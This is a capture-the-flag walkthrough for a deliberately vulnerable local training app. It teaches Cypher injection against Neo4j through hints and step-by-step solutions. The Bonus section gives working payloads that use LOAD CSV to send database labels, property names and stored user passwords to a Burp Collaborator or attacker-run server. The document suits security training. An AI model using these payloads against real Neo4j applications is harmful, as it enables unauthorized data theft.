## Neo4j 

In part, this application tests your knowledge of Neo4j and Cypher Query Language. Below you will find hints and steps for full walkthroughs for each level and the BONUS flags. The Walkthrough steps focus on the use of BurpSuite Pro, but for Easy, Medium, and Hard levels, BurpSuite Community and Zap can be used as well. For the BONUS flags, you will need one of the following:

1. Burp Collaborator
2. Your own webserver where you can see your access logs
    * This could be a server you already own as long as you are able to view the access logs
    * This could be a server you spin up with docker just for this exercise as long as you can view the acces logs

### EASY

<details>
  <summary>Hints</summary>

  1. Can you modify the request before it gets sent to server?
  2. Can you modify the request so the application displays an error that includes the Cypher query syntax? 
  3. Can you modify the request to include the Cypher equivalent of sql injection's ```x' or 'x'='x```?
</details>

<details>
  <summary>Walkthrough</summary>

  1. Browse to the [Neo4j page](http://localhost:8084/app/?db=neo4j) of the app.
  2. Using Burp or ZAP, intercept your request after clicking "go" on the app's Neo4j page.
  3. Edit ```person=Tom+Hanks``` to ```person=xxxxx"``` in the request body.
  4. Forward the request.
  5. Back in your browser, observe the query in the error message.
  6. Send another request and intercept it.
  7. Edit the request: Change ```person=Tom+Hanks``` to ```person=Tom+Hanks" or person.name=~".*```.
  8. Forward the request.
  9. Back in your browser look for the FLAGs.
</details>

### MEDIUM 

<details>
  <summary>Hints</summary>

  1. Modify the request so the application displays an error with the Cypher query. 
  2. The payload here depends on understanding Cypher Query Language as well as understanding how application code might rely on variable names used in the ```return``` portion of the query. 
</details>

<details>
  <summary>Walkthrough</summary>

  There are multiple ways to get the flags at this level, one of which does not require Cypher Injection; below is one that does, and requires some knowledge of Neo4j and Cypher Query Language.

  1. Browse to the [Neo4j page](http://localhost:8084/app/?db=neo4j) of the app.
  2. Select anything in the second dropdown.
  3. Using Burp or ZAP, intercept your request after clicking "go" on the app's Neo4j page.
  4. Edit ```person=Tom+Hanks``` to ```person=Tom+Hanks"``` in the request body.
  5. Forward the request.
  6. Back in your browser, observe the query in the error message.
  7. Send another request and intercept it.
  8. Edit the request: Change ```person=Tom+Hanks``` to ```person=Tom+Hanks"})-[role]-(movie) return person,role,movie//```.
  9. Create a text file containing the list of names from the select dropdown.
  10. Use Burp intruder to replace ```Tom+Hanks``` with the names from the file. 
  11. Find results in intruder that contain the text FLAG.
</details>

### HARD

<details>
  <summary>Hints</summary>

  1. There is no Cypher Injection attack at the Hard level 
  2. Burp Intruder and info you have gathered in the Easy and Meidum levels will help you at this level. 
</details>

<details>
  <summary>Walkthrough</summary>

  1. Turn Intercept off in Burp.
  2. Browse to the [Neo4j page](http://localhost:8084/app/?db=neo4j) of the app.
  3. Select anything in the second dropdown and click go.
  4. In Burp, find this request and send it to intruder.
  5. In intruder, select the value for ```person``` and the value for ```role``` as your attack vectors.
  6. Select Cluster Bomb as your Attack Type.
  7. Use the list of "persons" you used in Medium as the payload for ```person```.
  8. Use a list you've gathered from the previous 2 steps as the payload for ```role```.
  9. Click ```start attack```.
  10. Search for ```FLAG``` in the results to find the 3 flags at this level.
</details>

### BONUS  

<details>
  <summary>Hints</summary>

  1. To get the BONUS flags, you will need either:
    * Your own webserver where you may monitor access logs 
    * [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) 
  2. You will need to understand how to use [Neo4j's db.labels() and db.propertyKeys() procedures](https://Neo4j.com/docs/cypher-manual/current/clauses/call/) to map this database.
  3. You will need to understand how to use [Neo4j's LOAD CSV functionality](https://Neo4j.com/developer/guide-import-csv/) to cause Neo4j to make http requests.
  4. You will need to understand how to use the two together to [extract information from Neo4j](https://www.sidechannel.blog/en/the-cypher-injection-saga/).
  5. Focus on a ```person``` who had flags associated with their records already, like the ```Tom```s
</details>

<details>
  <summary>More Hints</summary>

You need [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client), which is sadly only available with Burpsuite Pro, or your own webserver where you are able to see HTTP access requests. You could add a basic webserver container to this set up and use that server's IP address and access logs in place of Burp Collaborator.

1. Set your challenge level to Medium
2. Get list of all labels in the database and look for something interesting

```
person=Christian+Bale"})+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://your.burpcollaboratorurl.com/'%2blabel+AS+r+return+person//&role=ACTED_IN&search=go
```

3. Get list of all properties in the database and look for something interesting

```
person=Christian+Bale"})+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+FROM+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&role=ACTED_IN&search=go
```

4. Try variations of the following payload, replacing LABEL with an actual label and PROPERTY with an actual property from steps 1 & 2. This will tell you what properties go with what labels - if results are returned, a property has been matched to a label. (We use the variable ```movie``` in these payloads because that's the variable the application code expects. Changing that would render no results and may cause errors instead of useful information)

```
person=Tom Cruise"})-[role]-(movie:LABEL)+WHERE+movie.PROPERTY+IS+NOT+null+return+person,role,movie//
```

For example, these should not return data because the User nodes do not have a property called ```notrealproperty``` or ```tagline```.

```
person=Tom Cruise"})-[role]-(movie:User)+WHERE+movie.notrealproperty+IS+NOT+null+return+person,role,movie//
person=Tom Cruise"})-[role]-(movie:User)+WHERE+movie.tagline+IS+NOT+null+return+person,role,movie//
```

And this should return data because the Movie nodes do have properties called ```tagline``` and ```released``` although they never show up in our web application

```
person=Tom Cruise"})-[role]-(movie:Movie)+WHERE+movie.tagline+IS+NOT+null+return+person,role,movie//
person=Tom Cruise"})-[role]-(movie:Movie)+WHERE+movie.released+IS+NOT+null+return+person,role,movie//
```

5. Once you've decided what LABEL and PROPERTY you are interested in, use the following payload, foreach person in the database, replacing LABEL with the label and PROPERTY with the property and watch your collaborator space or your server access logs for requests. 

```
person=Tom+Cruise"})-[role]->(movie:LABEL)+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bperson.name%2b'/'%2bmovie.PROPERTY+AS+r+return+person,role,movie//&role=DIRECTED&search=go
```

For example, we should now know node ```User``` has a property ```title``` so this should send information to collaborator or your web server

```
person=Tom+Cruise"})-[role]->(movie:User)+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bperson.name%2b'/'%2bmovie.title+AS+r+return+person,role,movie//&role=DIRECTED&search=go
```

6. Some of the flags may need to be further figured out.
</details>


<details>
  <summary>Exact steps to FLAGS</summary>

You need [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client), which is sadly only available with Burpsuite Pro, or your own webserver where you are able to see HTTP access requests. You could add a basic webserver container to this set up and use that server's IP address and access logs in place of Burp Collaborator.


1. Set your challenge level to Medium
2. Get a list of all labels in the database - you are looking for the ```User``` label.

```
person=Christian+Bale"+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
```

3. Get list of all properties in the database - you are looking for the ```password``` label. 

```
person=Christian+Bale"+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
```

4. Use the following payloads to get the BONUS flags.

```
person=Tom+Tykwer"})-[role]->(movie:User)+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bperson.name%2b'/'%2bmovie.password+AS+r+return+person,role,movie//&role=DIRECTED&search=go

person=Tom+Cruise"})-[role]->(movie:User)+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bperson.name%2b'/'%2bmovie.password+AS+r+return+person,role,movie//&role=DIRECTED&search=go

person=Tom+Skerritt"})-[role]->(movie:User)+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bperson.name%2b'/'%2bmovie.password+AS+r+return+person,role,movie//&role=DIRECTED&search=go
```

5. The BONUS^MEDIUM password is base64 encoded 3x. 
6. The BONUS^HARD password is encoded using Ceasar Cipher then converted to asciihex then base64 encoded.
</details>
